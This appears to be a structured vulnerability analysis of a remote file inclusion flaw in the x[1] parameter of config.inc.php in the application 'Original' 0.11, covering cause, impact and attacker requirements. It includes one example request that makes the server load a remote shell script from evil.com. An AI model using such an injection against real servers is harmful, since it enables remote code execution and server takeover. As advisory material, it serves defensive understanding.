Based on the provided content, here's a breakdown of the vulnerability described:

**Root Cause:**

*   The vulnerability is a **Remote File Inclusion (RFI)** vulnerability. This occurs because the application improperly handles user-supplied input, allowing an attacker to include a remote file into the application's execution context.

**Weaknesses/Vulnerabilities:**

*   **Unvalidated input:** The application fails to properly sanitize or validate the `x[1]` parameter in the `config.inc.php` file. This allows an attacker to inject an arbitrary URL.
*   **Remote file inclusion:** The application directly includes the remote file specified by the attacker via the vulnerable parameter.

**Impact of Exploitation:**

*   **Arbitrary code execution:** By including a malicious PHP file from a remote location, the attacker can execute arbitrary code on the server. This could lead to complete system compromise, data theft, denial of service, or other malicious activities.
*   **Full control of the server:** A successful RFI attack allows the attacker to take control of the web server, depending on the permissions of the web server user.

**Attack Vectors:**

*   **HTTP GET request:** The attacker crafts a malicious HTTP GET request to `config.inc.php` with a specially crafted `x[1]` parameter containing the URL of a malicious PHP script.
    *   Example: `[Path]/inc/config.inc.php?x[1]=http://evil.com/shell.php`

**Required Attacker Capabilities/Position:**

*   **Network access:** The attacker needs to be able to send HTTP requests to the vulnerable server.
*   **Malicious PHP script:** The attacker needs access to a web server that hosts the malicious PHP script which will be injected into the vulnerable application.

**Additional Details:**

*   The vulnerable application is "Original" version 0.11.
*   The vulnerable file is `config.inc.php`.
*   The vulnerable parameter is `x[1]`.
* The exploit was discovered by GoLd_M.
